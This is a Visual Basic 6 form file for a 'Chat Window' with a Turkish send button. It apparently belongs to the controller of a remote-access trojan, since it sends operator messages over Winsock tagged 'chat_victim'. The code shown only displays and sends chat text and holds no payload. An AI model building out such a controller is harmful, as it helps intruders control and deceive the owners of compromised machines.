VERSION 5.00
Begin VB.Form Form3 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Chat Window"
   ClientHeight    =   5160
   ClientLeft      =   1665
   ClientTop       =   1590
   ClientWidth     =   5790
   LinkTopic       =   "Form3"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   5160
   ScaleWidth      =   5790
   Begin VB.ListBox List1 
      Appearance      =   0  'Flat
      BackColor       =   &H80000001&
      ForeColor       =   &H0000FF00&
      Height          =   4320
      Left            =   0
      TabIndex        =   2
      Top             =   0
      Width           =   5775
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Gönder"
      Height          =   855
      Left            =   5040
      TabIndex        =   1
      Top             =   4320
      Width           =   735
   End
   Begin VB.TextBox Text2 
      Appearance      =   0  'Flat
      BackColor       =   &H80000001&
      ForeColor       =   &H0000FF00&
      Height          =   855
      Left            =   0
      MultiLine       =   -1  'True
      TabIndex        =   0
      Text            =   "client_3.frx":0000
      Top             =   4320
      Width           =   5055
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
List1.AddItem (vbNewLine & "Manager : " & Text2.Text)
Form1.Winsock1.SendData "chat_victim|" + Text2.Text
End Sub

Private Sub Form_Load()
List1.Enabled = True
End Sub

Private Sub Text2_Click()
Text2.Text = ""
End Sub

